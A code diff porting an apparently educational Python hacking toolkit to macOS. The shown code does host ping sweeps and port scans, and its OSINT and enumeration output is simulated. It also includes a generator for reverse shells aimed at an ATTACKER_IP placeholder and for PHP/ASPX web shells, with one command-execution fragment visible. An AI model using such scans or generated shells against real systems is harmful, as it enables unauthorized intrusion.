@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-Python Ethical Hacking Toolkit
+macOS Ethical Hacking Toolkit
 --------------------------------------------------
 A streamlined, interactive CLI tool designed for ethical hacking
-and security testing. This toolkit leverages Rich and Pyfiglet
-to provide an intuitive, visually appealing interface.
+and security testing from macOS. This toolkit leverages Rich and
+Pyfiglet to provide an intuitive, visually appealing interface.
 
 Features:
   • Network Scanning (Ping Sweep, Port Scan)
@@ -14,13 +14,11 @@ Features:
   • Basic Payload Generation
   • Settings and Configuration
 
-This script is adapted for Fedora Linux.
+This script is adapted for macOS (the attacker machine). Target hosts
+include Windows, web-based systems, and Linux/backends.
 Version: 1.0.0
 """
 
-# ----------------------------------------------------------------
-# Dependency Check and Imports
-# ----------------------------------------------------------------
 import atexit
 import datetime
 import ipaddress
@@ -40,26 +38,38 @@ from enum import Enum
 from pathlib import Path
 from typing import Any, Dict, List, Optional
 
+# Ensure the script is running on macOS
+if os.uname().sysname != "Darwin":
+    print("This toolkit is designed to run on macOS. Exiting.")
+    sys.exit(1)
 
+
+# ----------------------------------------------------------------
+# Dependency Check and Installation (macOS-specific)
+# ----------------------------------------------------------------
 def install_dependencies():
-    """Install required dependencies for the user."""
+    """
+    Ensure required third-party packages are installed.
+    Uses pip (with --user if not run as root) to install:
+      - rich
+      - pyfiglet
+      - prompt_toolkit
+      - requests
+    """
     required_packages = ["rich", "pyfiglet", "prompt_toolkit", "requests"]
     user = os.environ.get("SUDO_USER", os.environ.get("USER"))
-
-    if os.geteuid() != 0:
-        print(f"Installing dependencies for user: {user}")
-        subprocess.check_call(
-            [sys.executable, "-m", "pip", "install", "--user"] + required_packages
-        )
-        return
-
-    print(f"Running as sudo. Installing dependencies for user: {user}")
     try:
-        subprocess.check_call(
-            ["sudo", "-u", user, sys.executable, "-m", "pip", "install", "--user"]
-            + required_packages
-        )
-        print(f"Successfully installed dependencies for user: {user}")
+        if os.geteuid() != 0:
+            print(f"Installing dependencies for user: {user}")
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "--user"] + required_packages
+            )
+        else:
+            print(f"Running as sudo. Installing dependencies for user: {user}")
+            subprocess.check_call(
+                ["sudo", "-u", user, sys.executable, "-m", "pip", "install", "--user"]
+                + required_packages
+            )
     except subprocess.CalledProcessError as e:
         print(f"Failed to install dependencies: {e}")
         sys.exit(1)
@@ -91,33 +101,11 @@ try:
     from prompt_toolkit.history import FileHistory
     from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
     from prompt_toolkit.styles import Style as PtStyle
-
 except ImportError:
     print("Required libraries not found. Installing dependencies...")
-    try:
-        if os.geteuid() != 0:
-            subprocess.check_call(
-                [
-                    sys.executable,
-                    "-m",
-                    "pip",
-                    "install",
-                    "--user",
-                    "rich",
-                    "pyfiglet",
-                    "prompt_toolkit",
-                    "requests",
-                ]
-            )
-        else:
-            install_dependencies()
-        print("Dependencies installed successfully. Restarting script...")
-        os.execv(sys.executable, [sys.executable] + sys.argv)
-    except Exception as e:
-        print(f"Error installing dependencies: {e}")
-        print("Please install the required packages manually:")
-        print("pip install rich pyfiglet prompt_toolkit requests")
-        sys.exit(1)
+    install_dependencies()
+    print("Dependencies installed successfully. Restarting script...")
+    os.execv(sys.executable, [sys.executable] + sys.argv)
 
 install_rich_traceback(show_locals=True)
 console = Console()
@@ -128,8 +116,10 @@ console = Console()
 # ----------------------------------------------------------------
 class AppConfig:
     VERSION = "1.0.0"
-    APP_NAME = "Python Ethical Hacking Toolkit"
-    APP_SUBTITLE = "Security Testing & Reconnaissance Suite"
+    APP_NAME = "macOS Ethical Hacking Toolkit"
+    APP_SUBTITLE = (
+        "Security Testing & Reconnaissance Suite for Windows, Web, and Linux Targets"
+    )
     HOSTNAME = socket.gethostname()
 
     # Base directories
@@ -250,8 +240,6 @@ def create_header() -> Panel:
     """Create a stylish header with program name using Pyfiglet."""
     fonts = ["slant", "big", "digital", "standard", "small"]
     ascii_art = ""
-
-    # Try different fonts until a suitable one is found
     for font in fonts:
         try:
             fig = pyfiglet.Figlet(font=font, width=80)
@@ -260,31 +248,25 @@ def create_header() -> Panel:
                 break
         except Exception:
             continue
-
-    # Fallback if no font works
     if not ascii_art.strip():
         ascii_art = AppConfig.APP_NAME
 
-    # Style the ASCII art with Nord colors
     lines = ascii_art.splitlines()
     styled_lines = ""
     colors = [NordColors.RED, NordColors.FROST_2, NordColors.PURPLE]
-
     for i, line in enumerate(lines):
         color = colors[i % len(colors)]
         escaped_line = line.replace("[", "\\[").replace("]", "\\]")
         styled_lines += f"[bold {color}]{escaped_line}[/]\n"
-
     border = f"[{NordColors.FROST_3}]{'═' * 80}[/]"
     content = f"{border}\n{styled_lines}{border}"
-
     return Panel(
         Text.from_markup(content),
         border_style=Style(color=NordColors.FROST_1),
         padding=(1, 2),
         title=f"[bold {NordColors.SNOW_STORM_2}]v{AppConfig.VERSION}[/]",
         title_align="right",
-        subtitle=f"[bold {NordColors.SNOW_STORM_1}]{AppConfig.SUBTITLE}[/]",
+        subtitle=f"[bold {NordColors.SNOW_STORM_1}]{AppConfig.APP_SUBTITLE}[/]",
         subtitle_align="center",
     )
 
@@ -292,7 +274,6 @@ def create_header() -> Panel:
 def display_panel(
     message: str, style: str = NordColors.FROST_2, title: Optional[str] = None
 ) -> None:
-    """Display a styled panel with message."""
     panel = Panel(
         Text.from_markup(f"[bold {style}]{message}[/]"),
         border_style=style,
@@ -305,27 +286,22 @@ def display_panel(
 def print_message(
     text: str, style: str = NordColors.FROST_2, prefix: str = "•"
 ) -> None:
-    """Print a styled message with prefix."""
     console.print(f"[{style}]{prefix} {text}[/{style}]")
 
 
 def print_success(message: str) -> None:
-    """Print a success message."""
     print_message(message, NordColors.GREEN, "✓")
 
 
 def print_warning(message: str) -> None:
-    """Print a warning message."""
     print_message(message, NordColors.YELLOW, "⚠")
 
 
 def print_error(message: str) -> None:
-    """Print an error message."""
     print_message(message, NordColors.RED, "✗")
 
 
 def get_user_input(prompt_text: str, password: bool = False) -> str:
-    """Get input from user with styled prompt."""
     try:
         return pt_prompt(
             f"[bold {NordColors.PURPLE}]{prompt_text}:[/] ",
@@ -340,7 +316,6 @@ def get_user_input(prompt_text: str, password: bool = False) -> str:
 
 
 def get_confirmation(prompt_text: str) -> bool:
-    """Get yes/no confirmation from user."""
     try:
         return Confirm.ask(f"[bold {NordColors.FROST_2}]{prompt_text}[/]")
     except (KeyboardInterrupt, EOFError):
@@ -351,7 +326,6 @@ def get_confirmation(prompt_text: str) -> bool:
 def get_integer_input(
     prompt_text: str, min_value: int = None, max_value: int = None
 ) -> int:
-    """Get integer input from user with range validation."""
     try:
         return IntPrompt.ask(
             f"[bold {NordColors.FROST_2}]{prompt_text}[/]",
@@ -366,7 +340,6 @@ def get_integer_input(
 def display_progress(
     total: int, description: str, color: str = NordColors.FROST_2
 ) -> (Progress, int):
-    """Create and return a Progress object for tracking operations."""
     progress = Progress(
         SpinnerColumn("dots", style=f"bold {color}"),
         TextColumn(f"[bold {color}]{{task.description}}"),
@@ -383,11 +356,8 @@ def display_progress(
 
 
 def save_result_to_file(result: Any, filename: str) -> bool:
-    """Save a result object to a JSON file."""
     try:
         filepath = AppConfig.RESULTS_DIR / filename
-
-        # Convert to a serializable dict based on dataclass type
         if isinstance(result, ScanResult):
             result_dict = {
                 "target": result.target,
@@ -419,10 +389,8 @@ def save_result_to_file(result: Any, filename: str) -> bool:
             }
         else:
             result_dict = result.__dict__
-
         with open(filepath, "w") as f:
             json.dump(result_dict, f, indent=2)
-
         print_success(f"Results saved to: {filepath}")
         return True
     except Exception as e:
@@ -431,7 +399,6 @@ def save_result_to_file(result: Any, filename: str) -> bool:
 
 
 def get_prompt_style() -> PtStyle:
-    """Return the prompt toolkit style for consistent styling."""
     return PtStyle.from_dict({"prompt": f"bold {NordColors.PURPLE}"})
 
 
@@ -439,7 +406,6 @@ def get_prompt_style() -> PtStyle:
 # Module Functions
 # ----------------------------------------------------------------
 def network_scanning_module() -> None:
-    """Network scanning module with ping sweep and port scan capabilities."""
     console.clear()
     console.print(create_header())
     display_panel(
@@ -447,8 +413,6 @@ def network_scanning_module() -> None:
         NordColors.RECONNAISSANCE,
         "Network Scanning",
     )
-
-    # Sub-menu for scanning
     table = Table(show_header=False, box=None)
     table.add_column("Option", style=f"bold {NordColors.FROST_2}")
     table.add_column("Description", style=NordColors.SNOW_STORM_1)
@@ -456,7 +420,6 @@ def network_scanning_module() -> None:
     table.add_row("2", "Port Scan (Identify open ports)")
     table.add_row("0", "Return to Main Menu")
     console.print(table)
-
     choice = get_integer_input("Select an option", 0, 2)
     if choice == 0:
         return
@@ -464,36 +427,32 @@ def network_scanning_module() -> None:
         ping_sweep()
     elif choice == 2:
         port_scan()
-
     input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
 
 
 def ping_sweep() -> None:
-    """Perform a ping sweep to discover live hosts on a network."""
     target = get_user_input("Enter target subnet (e.g., 192.168.1.0/24)")
     if not target:
         return
-
     live_hosts = []
     try:
         network = ipaddress.ip_network(target, strict=False)
         hosts = list(network.hosts())
-
-        # Limit number for performance reasons
         hosts = hosts[: min(len(hosts), 100)]
         progress, task = display_progress(
             len(hosts), "Pinging hosts", NordColors.RECONNAISSANCE
         )
-
         with progress:
 
             def check_host(ip):
                 try:
-                    cmd = (
-                        ["ping", "-n", "1", "-w", "500", str(ip)]
-                        if sys.platform == "win32"
-                        else ["ping", "-c", "1", "-W", "1", str(ip)]
-                    )
+                    # Use macOS ping syntax
+                    if sys.platform == "win32":
+                        cmd = ["ping", "-n", "1", "-w", "500", str(ip)]
+                    elif sys.platform == "darwin":
+                        cmd = ["ping", "-c", "1", str(ip)]
+                    else:
+                        cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
                     if (
                         subprocess.run(
                             cmd,
@@ -509,9 +468,7 @@ def ping_sweep() -> None:
 
             with ThreadPoolExecutor(max_workers=AppConfig.DEFAULT_THREADS) as executor:
                 executor.map(check_host, hosts)
-
         progress.stop()
-
         if live_hosts:
             display_panel(
                 f"Found {len(live_hosts)} active hosts",
@@ -525,12 +482,9 @@ def ping_sweep() -> None:
             )
             host_table.add_column("IP Address", style=f"bold {NordColors.FROST_2}")
             host_table.add_column("Status", style=NordColors.GREEN)
-
             for ip in live_hosts:
                 host_table.add_row(ip, "● ACTIVE")
-
             console.print(host_table)
-
             if get_confirmation("Save these results to file?"):
                 timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                 filename = f"pingsweep_{target.replace('/', '_')}_{timestamp}.json"
@@ -539,24 +493,18 @@ def ping_sweep() -> None:
                 )
         else:
             display_panel("No active hosts found.", NordColors.RED, "Scan Complete")
-
     except Exception as e:
         print_error(f"Ping scan error: {e}")
 
 
 def port_scan() -> None:
-    """Scan a target for open ports."""
     target = get_user_input("Enter target IP")
     if not target:
         return
-
     port_range = get_user_input(
         "Enter port range (e.g., 1-1000) or leave blank for common ports"
     )
-
     open_ports = {}
-
-    # Define ports to scan
     if port_range:
         try:
             start, end = map(int, port_range.split("-"))
@@ -581,11 +529,9 @@ def port_scan() -> None:
             ]
     else:
         ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080]
-
     progress, task = display_progress(
         len(ports), "Scanning ports", NordColors.RECONNAISSANCE
     )
-
     with progress:
         for port in ports:
             try:
@@ -599,9 +545,7 @@ def port_scan() -> None:
                 pass
             finally:
                 progress.update(task, advance=1)
-
     progress.stop()
-
     if open_ports:
         display_panel(
             f"Found {len(open_ports)} open ports on {target}",
@@ -616,16 +560,11 @@ def port_scan() -> None:
         port_table.add_column("Port", style=f"bold {NordColors.FROST_2}")
         port_table.add_column("Service", style=NordColors.SNOW_STORM_1)
         port_table.add_column("State", style=NordColors.GREEN)
-
         for port, info in sorted(open_ports.items()):
             port_table.add_row(
-                str(port),
-                info.get("service", "unknown"),
-                info.get("state", "unknown"),
+                str(port), info.get("service", "unknown"), info.get("state", "unknown")
             )
-
         console.print(port_table)
-
         if get_confirmation("Save these results to file?"):
             scan_result = ScanResult(target=target, port_data=open_ports)
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -638,7 +577,6 @@ def port_scan() -> None:
 
 
 def osint_gathering_module() -> None:
-    """OSINT gathering module for domain intelligence."""
     console.clear()
     console.print(create_header())
     display_panel(
@@ -646,34 +584,25 @@ def osint_gathering_module() -> None:
         NordColors.RECONNAISSANCE,
         "OSINT Gathering",
     )
-
     domain = get_user_input("Enter target domain (e.g., example.com)")
     if not domain:
         return
-
     with console.status(
         f"[bold {NordColors.FROST_2}]Gathering intelligence on {domain}..."
     ):
         time.sleep(1.5)  # Simulated processing time
         result = gather_domain_info(domain)
-
     display_osint_result(result)
-
     if get_confirmation("Save these results to file?"):
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"osint_domain_{domain.replace('.', '_')}_{timestamp}.json"
         save_result_to_file(result, filename)
-
     input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
 
 
 def gather_domain_info(domain: str) -> OSINTResult:
-    """Gather domain intelligence (simulated)."""
     data = {}
-
-    # Simulate gathering domain information
     try:
-        # Simulated WHOIS information
         data["whois"] = {
             "registrar": "Example Registrar, Inc.",
             "creation_date": f"{random.randint(1995, 2020)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
@@ -687,8 +616,6 @@ def gather_domain_info(domain: str) -> OSINTResult:
             ),
             "name_servers": [f"ns{i}.cloudflare.com" for i in range(1, 3)],
         }
-
-        # Simulated DNS records
         data["dns"] = {
             "a_records": [
                 f"192.0.2.{random.randint(1, 255)}" for _ in range(random.randint(1, 3))
@@ -697,8 +624,6 @@ def gather_domain_info(domain: str) -> OSINTResult:
             "txt_records": [f"v=spf1 include:_spf.{domain} ~all"],
             "ns_records": data["whois"]["name_servers"],
         }
-
-        # Simulated SSL certificate information
         data["ssl"] = {
             "issuer": random.choice(
                 ["Let's Encrypt Authority X3", "DigiCert Inc", "Sectigo Limited"]
@@ -707,20 +632,14 @@ def gather_domain_info(domain: str) -> OSINTResult:
             "valid_to": f"{random.randint(2023, 2024)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
             "serial_number": str(random.randint(1000000000, 9999999999)),
         }
-
-        # Simulated subdomains
         data["subdomains"] = [f"www.{domain}", f"mail.{domain}", f"api.{domain}"]
     except Exception as e:
         print_error(f"Error gathering domain info: {e}")
-
     return OSINTResult(target=domain, source_type="domain_analysis", data=data)
 
 
 def display_osint_result(result: OSINTResult) -> None:
-    """Display OSINT results in a structured format."""
     console.print()
-
-    # Display basic information panel
     panel = Panel(
         Text.from_markup(
             f"[bold {NordColors.FROST_2}]Target:[/] {result.target}\n"
@@ -730,8 +649,6 @@ def display_osint_result(result: OSINTResult) -> None:
         border_style=NordColors.RECONNAISSANCE,
     )
     console.print(panel)
-
-    # Display WHOIS information
     whois = result.data.get("whois", {})
     if whois:
         table = Table(
@@ -741,15 +658,11 @@ def display_osint_result(result: OSINTResult) -> None:
         )
         table.add_column("Property", style=f"bold {NordColors.FROST_2}")
         table.add_column("Value", style=NordColors.SNOW_STORM_1)
-
         for key, value in whois.items():
             if key == "name_servers":
                 value = ", ".join(value)
             table.add_row(key.replace("_", " ").title(), str(value))
-
         console.print(table)
-
-    # Display DNS records
     dns = result.data.get("dns", {})
     if dns:
         table = Table(
@@ -759,16 +672,12 @@ def display_osint_result(result: OSINTResult) -> None:
         )
         table.add_column("Record Type", style=f"bold {NordColors.FROST_2}")
         table.add_column("Value", style=NordColors.SNOW_STORM_1)
-
         for rtype, values in dns.items():
             table.add_row(
                 rtype.upper(),
                 "\n".join(values) if isinstance(values, list) else str(values),
             )
-
         console.print(table)
-
-    # Display SSL certificate information
     ssl = result.data.get("ssl", {})
     if ssl:
         table = Table(
@@ -778,13 +687,9 @@ def display_osint_result(result: OSINTResult) -> None:
         )
         table.add_column("Property", style=f"bold {NordColors.FROST_2}")
         table.add_column("Value", style=NordColors.SNOW_STORM_1)
-
         for key, value in ssl.items():
             table.add_row(key.replace("_", " ").title(), str(value))
-
         console.print(table)
-
-    # Display subdomains
     subs = result.data.get("subdomains", [])
     if subs:
         table = Table(
@@ -793,17 +698,13 @@ def display_osint_result(result: OSINTResult) -> None:
             header_style=f"bold {NordColors.FROST_1}",
         )
         table.add_column("Subdomain", style=f"bold {NordColors.FROST_2}")
-
         for sub in subs:
             table.add_row(sub)
-
         console.print(table)
-
     console.print()
 
 
 def username_enumeration_module() -> None:
-    """Username enumeration module to check username presence across platforms."""
     console.clear()
     console.print(create_header())
     display_panel(
@@ -811,24 +712,19 @@ def username_enumeration_module() -> None:
         NordColors.ENUMERATION,
         "Username Enumeration",
     )
-
     username = get_user_input("Enter username to check")
     if not username:
         return
-
     result = check_username(username)
     display_username_results(result)
-
     if get_confirmation("Save these results to file?"):
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"username_{username}_{timestamp}.json"
         save_result_to_file(result, filename)
-
     input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
 
 
 def check_username(username: str) -> UsernameResult:
-    """Simulated check for username presence across multiple platforms."""
     platforms = {
         "Twitter": f"https://twitter.com/{username}",
         "GitHub": f"https://github.com/{username}",
@@ -836,33 +732,22 @@ def check_username(username: str) -> UsernameResult:
         "Reddit": f"https://reddit.com/user/{username}",
         "LinkedIn": f"https://linkedin.com/in/{username}",
     }
-
     results = {}
     progress, task = display_progress(
         len(platforms), "Checking platforms", NordColors.ENUMERATION
     )
-
     with progress:
         for platform, url in platforms.items():
-            # Simulate a network delay
-            time.sleep(0.3)
-
-            # Simulate result with some randomness
-            # Longer usernames are less likely to be taken
+            time.sleep(0.3)  # Simulated network delay
             likelihood = 0.7 if len(username) < 6 else 0.4
             results[platform] = random.random() < likelihood
-
             progress.update(task, advance=1)
-
     progress.stop()
-
     return UsernameResult(username=username, platforms=results)
 
 
 def display_username_results(result: UsernameResult) -> None:
-    """Display username enumeration results in a structured format."""
     console.print()
-
     panel = Panel(
         Text.from_markup(
             f"[bold {NordColors.FROST_2}]Username:[/] {result.username}\n"
@@ -872,7 +757,6 @@ def display_username_results(result: UsernameResult) -> None:
         border_style=NordColors.ENUMERATION,
     )
     console.print(panel)
-
     table = Table(
         title="Platform Results",
         show_header=True,
@@ -881,7 +765,6 @@ def display_username_results(result: UsernameResult) -> None:
     table.add_column("Platform", style=f"bold {NordColors.FROST_2}")
     table.add_column("Status", style=NordColors.SNOW_STORM_1)
     table.add_column("URL", style=NordColors.FROST_3)
-
     found_count = 0
     for platform, found in result.platforms.items():
         if found:
@@ -891,23 +774,18 @@ def display_username_results(result: UsernameResult) -> None:
         else:
             status = f"[dim {NordColors.RED}]○ NOT FOUND[/]"
             url = "N/A"
-
         table.add_row(platform, status, url)
-
     console.print(table)
-
     if found_count > 0:
         console.print(
             f"[bold {NordColors.GREEN}]Username found on {found_count} platforms.[/]"
         )
     else:
         console.print(f"[bold {NordColors.RED}]Username not found on any platforms.[/]")
-
     console.print()
 
 
 def service_enumeration_module() -> None:
-    """Service enumeration module to gather information about network services."""
     console.clear()
     console.print(create_header())
     display_panel(
@@ -915,40 +793,31 @@ def service_enumeration_module() -> None:
         NordColors.ENUMERATION,
         "Service Enumeration",
     )
-
     host = get_user_input("Enter target host (IP or hostname)")
     if not host:
         return
-
     port = get_integer_input("Enter port number", 1, 65535)
     if port <= 0:
         return
-
     service = get_user_input(
         "Enter service name (optional, leave blank to auto-detect)"
     )
-
     with console.status(
         f"[bold {NordColors.FROST_2}]Enumerating service on {host}:{port}..."
     ):
         time.sleep(2)  # Simulated processing time
         result = enumerate_service(host, port, service if service else None)
-
     display_service_results(result)
-
     if get_confirmation("Save these results to file?"):
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"service_{host}_{port}_{timestamp}.json"
         save_result_to_file(result, filename)
-
     input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
 
 
 def enumerate_service(
     host: str, port: int, service_name: Optional[str] = None
 ) -> ServiceResult:
-    """Simulate service enumeration."""
-    # Common service ports mapping
     common_services = {
         21: "FTP",
         22: "SSH",
@@ -965,12 +834,8 @@ def enumerate_service(
         5432: "PostgreSQL",
         8080: "HTTP-Proxy",
     }
-
-    # Auto-detect service if not specified
     if not service_name:
         service_name = common_services.get(port, "Unknown")
-
-    # Simulate version information
     versions = {
         "FTP": ["vsftpd 3.0.3", "ProFTPD 1.3.5"],
         "SSH": ["OpenSSH 7.6", "OpenSSH 8.2"],
@@ -978,10 +843,8 @@ def enumerate_service(
         "HTTPS": ["Apache/2.4.29 (SSL)", "nginx/1.14.0 (SSL)"],
         "MySQL": ["MySQL 5.7.32", "MySQL 8.0.21"],
     }
-
     version = random.choice(versions.get(service_name, ["Unknown"]))
     details = {"banner": f"{service_name} Server {version}"}
-
     return ServiceResult(
         service_name=service_name,
         version=version,
@@ -992,9 +855,7 @@ def enumerate_service(
 
 
 def display_service_results(result: ServiceResult) -> None:
-    """Display service enumeration results in a structured format."""
     console.print()
-
     panel = Panel(
         Text.from_markup(
             f"[bold {NordColors.FROST_2}]Service:[/] {result.service_name}\n"
@@ -1006,7 +867,6 @@ def display_service_results(result: ServiceResult) -> None:
         border_style=NordColors.ENUMERATION,
     )
     console.print(panel)
-
     table = Table(
         title="Service Details",
         show_header=True,
@@ -1014,24 +874,18 @@ def display_service_results(result: ServiceResult) -> None:
     )
     table.add_column("Property", style=f"bold {NordColors.FROST_2}")
     table.add_column("Value", style=NordColors.SNOW_STORM_1)
-
-    # Add banner information
     table.add_row("Banner", result.details.get("banner", "N/A"))
-
-    # Add other details if available
     for key, value in result.details.items():
         if key == "banner":
             continue
         if isinstance(value, list):
             value = ", ".join(value)
         table.add_row(key.replace("_", " ").title(), str(value))
-
     console.print(table)
     console.print()
 
 
 def payload_generation_module() -> None:
-    """Generate basic reverse shells and other payloads."""
     console.clear()
     console.print(create_header())
     display_panel(
@@ -1039,7 +893,6 @@ def payload_generation_module() -> None:
         NordColors.EXPLOITATION,
         "Payload Generation",
     )
-
     table = Table(show_header=False, box=None)
     table.add_column("Option", style=f"bold {NordColors.FROST_2}")
     table.add_column("Description", style=NordColors.SNOW_STORM_1)
@@ -1047,67 +900,49 @@ def payload_generation_module() -> None:
     table.add_row("2", "Web Shell")
     table.add_row("0", "Return to Main Menu")
     console.print(table)
-
     choice = get_integer_input("Select payload type", 0, 2)
     if choice == 0:
         return
-
-    payload_types = {
-        1: "shell_reverse",
-        2: "web",
-    }
-
+    payload_types = {1: "shell_reverse", 2: "web"}
     payload_type = payload_types[choice]
     platforms = []
-
     if payload_type == "shell_reverse":
         platforms = ["linux", "windows"]
     elif payload_type == "web":
         platforms = ["php", "aspx"]
-
     console.print(f"\n[bold {NordColors.FROST_2}]Available Target Platforms:[/]")
     for i, plat in enumerate(platforms, 1):
         console.print(f"  {i}. {plat.capitalize()}")
-
     plat_choice = get_integer_input("Select target platform", 1, len(platforms))
     if plat_choice < 1:
         return
-
     target_platform = platforms[plat_choice - 1]
-
-    # Get payload customization options
     if payload_type == "shell_reverse":
         ip = get_user_input("Enter your IP address")
         port = get_integer_input("Enter listening port", 1, 65535)
-
         with console.status(
             f"[bold {NordColors.FROST_2}]Generating {payload_type} payload for {target_platform}..."
         ):
-            time.sleep(1)  # Simulated processing time
+            time.sleep(1)
             payload = generate_payload(payload_type, target_platform, ip, port)
     else:
         with console.status(
             f"[bold {NordColors.FROST_2}]Generating {payload_type} payload for {target_platform}..."
         ):
-            time.sleep(1)  # Simulated processing time
+            time.sleep(1)
             payload = generate_payload(payload_type, target_platform)
-
     display_payload(payload)
-
     if get_confirmation("Save this payload to file?"):
         filepath = save_payload(payload)
         print_success(f"Payload saved to {filepath}")
-
     input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
 
 
 def generate_payload(
     payload_type: str, target_platform: str, ip: str = "ATTACKER_IP", port: int = 4444
 ) -> Payload:
-    """Generate a payload based on type and platform."""
     name = f"{payload_type}_{target_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
     content = ""
-
     if payload_type == "shell_reverse":
         if target_platform == "linux":
             content = f"""#!/bin/bash
@@ -1191,7 +1026,6 @@ if(isset($_REQUEST['cmd'])){
 </body>
 </html>
 """
-
     return Payload(
         name=name,
         payload_type=payload_type,
@@ -1201,30 +1035,22 @@ if(isset($_REQUEST['cmd'])){
 
 
 def save_payload(payload: Payload) -> str:
-    """Save a payload to file with appropriate extension."""
     ext = "txt"
-
     if payload.target_platform in ["linux", "windows"]:
         ext = "sh" if payload.target_platform == "linux" else "ps1"
     elif payload.target_platform == "php":
         ext = "php"
     elif payload.target_platform == "aspx":
         ext = "aspx"
-
     filename = f"{payload.name}.{ext}"
     filepath = AppConfig.PAYLOADS_DIR / filename
-
     with open(filepath, "w") as f:
         f.write(payload.content)
-
     return str(filepath)
 
 
 def display_payload(payload: Payload) -> None:
-    """Display payload details and content."""
     console.print()
-
-    # Determine the syntax highlighting language
     language = "bash"
     if payload.target_platform == "windows":
         language = "powershell"
@@ -1232,8 +1058,6 @@ def display_payload(payload: Payload) -> None:
         language = "php"
     elif payload.target_platform == "aspx":
         language = "html"
-
-    # Display payload info panel
     panel = Panel(
         Text.from_markup(
             f"[bold {NordColors.FROST_2}]Type:[/] {payload.payload_type}\n"
@@ -1244,20 +1068,15 @@ def display_payload(payload: Payload) -> None:
         border_style=NordColors.EXPLOITATION,
     )
     console.print(panel)
-
-    # Display the payload content with syntax highlighting
     from rich.syntax import Syntax
 
     console.print(Syntax(payload.content, language, theme="nord", line_numbers=True))
-
-    # Show disclaimer
     console.print(
         f"[bold {NordColors.YELLOW}]DISCLAIMER:[/] This payload is for educational purposes only."
     )
 
 
 def settings_module() -> None:
-    """Settings module to configure application behavior."""
     console.clear()
     console.print(create_header())
     display_panel(
@@ -1265,10 +1084,8 @@ def settings_module() -> None:
         NordColors.UTILITIES,
         "Settings and Configuration",
     )
-
     config = load_config()
     display_config(config)
-
     table = Table(show_header=False, box=None)
     table.add_column("Option", style=f"bold {NordColors.FROST_2}")
     table.add_column("Description", style=NordColors.SNOW_STORM_1)
@@ -1278,9 +1095,7 @@ def settings_module() -> None:
     table.add_row("4", "Reset to Default Settings")
     table.add_row("0", "Return to Main Menu")
     console.print(table)
-
     choice = get_integer_input("Select an option", 0, 4)
-
     if choice == 0:
         return
     elif choice == 1:
@@ -1303,11 +1118,9 @@ def settings_module() -> None:
         for i, agent in enumerate(AppConfig.USER_AGENTS, 1):
             console.print(f"{i}. {agent}")
         console.print(f"{len(AppConfig.USER_AGENTS) + 1}. Custom User Agent")
-
         agent_choice = get_integer_input(
             "Select a user agent", 1, len(AppConfig.USER_AGENTS) + 1
         )
-
         if agent_choice > 0:
             if agent_choice <= len(AppConfig.USER_AGENTS):
                 config["user_agent"] = AppConfig.USER_AGENTS[agent_choice - 1]
@@ -1315,7 +1128,6 @@ def settings_module() -> None:
                 custom = get_user_input("Enter custom user agent")
                 if custom:
                     config["user_agent"] = custom
-
             if save_config(config):
                 print_success("User agent updated")
     elif choice == 4:
@@ -1325,31 +1137,22 @@ def settings_module() -> None:
                 "timeout": AppConfig.DEFAULT_TIMEOUT,
                 "user_agent": random.choice(AppConfig.USER_AGENTS),
             }
-
             if save_config(default_config):
                 print_success("Settings reset to default")
-
     input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
 
 
 def load_config() -> Dict[str, Any]:
-    """Load configuration from the config file."""
     config_file = AppConfig.CONFIG_DIR / "config.json"
-
-    # Default configuration
     default = {
         "threads": AppConfig.DEFAULT_THREADS,
         "timeout": AppConfig.DEFAULT_TIMEOUT,
         "user_agent": random.choice(AppConfig.USER_AGENTS),
     }
-
-    # Create default config if file doesn't exist
     if not config_file.exists():
         with open(config_file, "w") as f:
             json.dump(default, f, indent=2)
         return default
-
-    # Load existing config
     try:
         with open(config_file, "r") as f:
             return json.load(f)
@@ -1359,9 +1162,7 @@ def load_config() -> Dict[str, Any]:
 
 
 def save_config(config: Dict[str, Any]) -> bool:
-    """Save configuration to the config file."""
     config_file = AppConfig.CONFIG_DIR / "config.json"
-
     try:
         with open(config_file, "w") as f:
             json.dump(config, f, indent=2)
@@ -1372,7 +1173,6 @@ def save_config(config: Dict[str, Any]) -> bool:
 
 
 def display_config(config: Dict[str, Any]) -> None:
-    """Display current configuration settings."""
     table = Table(
         title="Current Configuration",
         show_header=True,
@@ -1380,46 +1180,41 @@ def display_config(config: Dict[str, Any]) -> None:
     )
     table.add_column("Setting", style=f"bold {NordColors.FROST_2}")
     table.add_column("Value", style=NordColors.SNOW_STORM_1)
-
     for key, value in config.items():
         formatted = ", ".join(value) if isinstance(value, list) else str(value)
         table.add_row(key.replace("_", " ").title(), formatted)
-
     console.print(table)
 
 
 def display_help() -> None:
-    """Display help and documentation."""
     console.clear()
     console.print(create_header())
     display_panel("Help and Documentation", NordColors.UTILITIES, "Help Center")
-
     help_text = """
 ## Overview
-Python Ethical Hacking Toolkit is a CLI tool for security testing and ethical hacking.
+macOS Ethical Hacking Toolkit is a CLI tool for security testing and ethical hacking.
 It provides modules for network scanning, OSINT collection, enumeration, and payload generation.
 
 ## Modules
 1. **Network Scanning**: Discover active hosts and open ports
 2. **OSINT Gathering**: Collect publicly available target information
-3. **Username Enumeration**: Check for usernames across platforms
+3. **Username Enumeration**: Check for username availability across platforms
 4. **Service Enumeration**: Gather service details
 5. **Payload Generation**: Create basic reverse and web shells
 6. **Settings**: Configure application settings
 
 ## Usage Tips
-- Use Network Scanning to identify active hosts on a network before further enumeration
